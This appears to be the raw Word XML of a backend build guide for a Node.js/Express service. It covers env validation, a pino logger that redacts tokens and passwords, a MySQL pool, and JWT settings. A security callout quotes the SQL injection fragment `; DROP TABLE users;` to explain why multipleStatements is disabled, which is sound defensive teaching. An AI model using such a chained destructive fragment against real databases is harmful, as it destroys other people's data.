              <w:t xml:space="preserve">  JWT_REFRESH_TTL_SEC: num({ default: 604800 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  BCRYPT_ROUNDS: num({ default: 10 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  LOGIN_RATE_WINDOW_MS: num({ default: 900000 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  LOGIN_RATE_MAX: num({ default: 10 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  LOG_LEVEL: str({ default: 'info' }),</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Cross-field invariant: secrets MUST differ. envalid cannot express this.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (env.JWT_ACCESS_SECRET === env.JWT_REFRESH_SECRET) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  console.error('FATAL: JWT_ACCESS_SECRET and JWT_REFRESH_SECRET must differ');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  process.exit(1);</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module.exports = Object.freeze(env);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.5  src/config/logger.js — Pino + Redaction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Single shared pino instance used by the whole backend. The redact.paths array is the single most important configuration in this file: it scrubs Authorization headers, Cookie headers, Set-Cookie headers, password fields, and any *jwtSecret-named field from EVERY log line. Even at debug level, tokens never hit disk.</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src/config/logger.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const pino = require('pino');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const env = require('./env');</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const logger = pino({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  level: env.LOG_LEVEL,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  redact: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    paths: [</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      'req.headers.authorization',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      'req.headers.cookie',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      'res.headers["set-cookie"]',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      '*.password', '*.password_hash',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      '*.jwtAccessSecret', '*.jwtRefreshSecret',</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censor: '***',</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base: { service: 'cmcmis-be', env: env.NODE_ENV },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  transport: env.NODE_ENV === 'development'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ? { target: 'pino-pretty',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        options: { colorize: true, translateTime: 'SYS:HH:MM:ss.l',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                   ignore: 'pid,hostname,service,env' } }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    : undefined,</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module.exports = logger;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.6  src/config/db.js — MySQL Pool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Owns the single shared connection pool. Every repository in src/modules/* imports this pool and uses parameterised queries through it.</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src/config/db.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const mysql = require('mysql2/promise');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const env = require('./env');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const logger = require('./logger');</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const pool = mysql.createPool({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  host: env.DB_HOST, port: env.DB_PORT,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  user: env.DB_USER, password: env.DB_PASSWORD,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  database: env.DB_NAME,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  connectionLimit: env.DB_POOL_LIMIT,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  charset: 'utf8mb4', timezone: 'Z',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  dateStrings: false,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  // multipleStatements omitted → defaults to FALSE → SQL-injection amplifier disarmed.</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Boot-time connectivity probe. Exits the process on failure.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>(async () =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const conn = await pool.getConnection();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await conn.query('SELECT 1');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    conn.release();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    logger.info({ host: env.DB_HOST, db: env.DB_NAME }, 'DB pool ready');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  } catch (err) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    logger.fatal({ err: { message: err.message, code: err.code } },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                 'DB pool failed to connect — exiting');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    setTimeout(() =&gt; process.exit(1), 50);</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module.exports = pool;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEE2E2"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B91C1C"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B91C1C"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">SECURITY  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Why multipleStatements is OFF</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>With multipleStatements:true, a single injected fragment can chain `; DROP TABLE users;`.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Phase 3 migration runner enables it deliberately to execute SQL files; runtime code MUST keep it off.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Combined with `?`-placeholder queries (the only SQL style allowed in the repos), the attack surface is minimal.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.7  src/config/jwt.js — Thin Facade Over JWT Settings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Tiny facade so call-sites that need JWT config (auth.service, authenticate middleware) do not import env directly — they import this. Single point of audit for 'which knobs control JWT behaviour?'.</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src/config/jwt.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const env = require('./env');</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module.exports = Object.freeze({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  alg: 'HS256',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  accessSecret:  env.JWT_ACCESS_SECRET,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  refreshSecret: env.JWT_REFRESH_SECRET,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  accessTtlSec:  env.JWT_ACCESS_TTL_SEC,   // 15 minutes</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  refreshTtlSec: env.JWT_REFRESH_TTL_SEC,  // 7 days</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>});</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.8  src/server.js — The Minimal Boot File</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>STEP 1 ends with this file: env + logger + db boot, /healthz, SIGTERM/SIGINT graceful shutdown, last-resort handlers for unhandled rejections and uncaught exceptions.</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src/server.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const env = require('./config/env');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const logger = require('./config/logger');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>require('./config/db'); // side effect: kicks off SELECT 1</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const express = require('express');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
